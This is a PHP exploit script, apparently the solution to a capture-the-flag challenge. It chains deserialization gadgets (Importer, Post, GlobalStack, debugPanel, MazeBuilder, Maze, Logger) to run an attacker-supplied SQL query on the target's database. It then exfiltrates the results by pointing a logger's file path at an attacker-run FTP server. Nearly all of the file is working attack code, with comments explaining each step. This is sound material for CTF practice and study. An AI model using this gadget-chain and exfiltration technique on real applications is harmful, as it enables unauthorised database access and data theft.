<?php 

include_once("class.php");

// Always start with something that can run without error (Maze)
$payload = makeMazeSerial();

// For this token, we need to run a SQL query
// We start by creating the Database connection using the conveniently provided initDB function
$payload = makeImporterSerial($payload, new secondToken, "initDB");

// Now the callback argument contains the PDO connection object
// We now need to prepare the SQL query to run
// We will pass the query itself in another POST variable, later
// The prepare call we need can be found in the Post::createSample method
// This calls prepare on $this->MazeBuilder; we can set $this->MazeBuilder using Post::assignSampleBuilder
$payload = makeImporterSerial($payload, new Post, "assignSampleBuilder");

// For createSample to work, we need to pass a string for $_POST
// The only option for getting a string at the moment is from Defaults::ok, which returns #f3f3cfff
// This name is unusual, but works fine
$payload = makeImporterSerial($payload, new Defaults, "ok");

// Now we can call prepare through createSample, passing #f3f3cfff in the callback argument
$payload = makeImporterSerial($payload, new Post, "createSample");

// The callback argument now contains a Statement object, which we now need to execute
// An execute call can be found in debugPanel::getExecutionTime
// However, we will need to access the Statement value again
// The execute function will return true/false, so we would lose access to it!
// We can store the statement on the stack so we can retrieve it later
$payload = makeImporterSerial($payload, new GlobalStack, "push");

// Push returns the value, so now we call getExecutionTime
$payload = makeImporterSerial($payload, new debugPanel, "getExecutionTime");

// Retrieve the statement, which has now executed
// Pop would work just fine since we only need to access it once
$payload = makeImporterSerial($payload, new GlobalStack, "peek");

// With statement back in the callback argument, we need to access it somehow
// Statement is a traversable object, so a foreach would work
// We can find one in MazeBuilder::invertMaze
// This is built for mazes, but it will also work for the Statement since string objects will "fall through"
$payload = makeImporterSerial($payload, new MazeBuilder, "invertMaze");

// Now, we can't pass the array directly to file_put_contents to write it
// Instead, we can use Maze::dump to convert the array into a string
$payload = makeImporterSerial($payload, new Maze, "dump");

// Call the logger, but with file set to ftp://IP
$ip = current(preg_grep('/^10\./', explode(' ', trim(shell_exec('hostname -I')))));

$URI = "ftp://user:password@$ip:2121";

$logger = new Logger();
$logger->logFile = $URI;

$payload = makeImporterSerial($payload, $logger, "log");

// Now output the payload
echo "import:     $payload\n\n\n";
file_put_contents("import.txt", $payload);

// Finally, our SQL statement
// Since this is the solution, we already know the table name is superSecretTableOfMazes
// However, if you want to retrieve all the tables first, uncomment the below line to switch the sql
$sql = "SELECT * FROM superSecretTableOfMazes";
// $sql = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES";

// Now, we need to put the SQL in the #f3f3cfff POST var
echo "sql:     $sql\n\n\n";
file_put_contents("#f3f3cfff.txt", $sql);